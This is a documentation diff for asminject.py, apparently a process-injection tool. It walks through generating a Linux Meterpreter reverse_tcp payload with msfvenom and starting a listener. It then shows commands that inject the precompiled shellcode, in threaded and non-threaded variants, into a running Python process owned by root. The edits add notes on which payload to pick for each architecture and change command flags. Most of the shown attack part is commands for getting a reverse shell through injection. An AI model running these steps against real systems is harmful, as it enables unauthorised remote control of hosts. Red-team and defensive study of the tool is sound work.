@@ -29,7 +29,9 @@ $ sudo python3 practice/python_loop.py
 2022-05-12T20:11:40.620506 - Loop count 2
 ```
 
-In a separate terminal, generate a Meterpreter payload, then launch a listener:
+In a separate terminal, generate a Meterpreter payload, then launch a listener.
+
+Note: in this example, the `linux/x64/meterpreter/reverse_tcp` payload is specified because the corresponding `asminject.py` example below is using the `x86-64` architecture. For `x86`, you'd want to use `linux/x86/meterpreter/reverse_tcp`, and for `arm32`, you'd want to use `linux/armle/meterpreter/reverse_tcp`.
 
 ```
 # msfvenom -p linux/x64/meterpreter/reverse_tcp -f raw \
@@ -68,7 +70,8 @@ root     2144475  [...] sudo python3 practice/python_loop.py
 root     2144476  [...] python3 practice/python_loop.py
 
 # python3 ./asminject.py 2144476 execute_precompiled-threaded.s \
-   --stop-method "slow" --precompiled lmrt11443
+   --relative-offsets-from-binaries \
+   --precompiled lmrt11443
 
 ...omitted for brevity...
 ```
@@ -89,11 +92,11 @@ Meterpreter  : x64/linux
 
 ## Shellcode injection without  multithreading
 
-The `execute_precompiled.s` payload is identical to the `execute_precompiled-threaded.s` payload, except that it does not spawn a separate thread. This has the downside of not allowing the target process to keep executing normally after injection, but means that `libpthread` is not required. Just swap out the payload name, e.g.:
+The `execute_precompiled.s` payload is identical to the `execute_precompiled-threaded.s` payload, except that it does not spawn a separate thread. This has the downside of not allowing the target process to keep executing normally after injection, but means that `libpthread` (or any other library) is not required. Just swap out the payload name, e.g.:
 
 ```
 # python3 ./asminject.py 2144476 execute_precompiled.s \
-   --stop-method "slow" --precompiled lmrt11443
+   --precompiled lmrt11443
 ```
 
 Unless the shellcode is written specifically to return, this payload will never inform `asminject.py` that it is finished, so you'll need to Ctrl-C out of `asminject.py` after injection is successful.
